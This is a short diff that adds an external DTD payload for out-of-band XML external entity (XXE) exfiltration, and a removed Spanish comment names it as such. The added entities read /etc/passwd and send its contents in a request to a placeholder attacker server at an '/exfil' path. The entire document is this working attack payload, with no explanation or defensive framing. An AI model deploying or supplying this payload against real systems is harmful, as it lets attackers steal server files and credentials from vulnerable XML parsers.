@@ -1,2 +1,3 @@
-#DTD para exfiltrar datos por XXE
-
+<!ENTITY % p1 SYSTEM "file:///etc/passwd">
+<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://tu-servidor:puerto/exfil?data=%p1;'>">
+%p2;
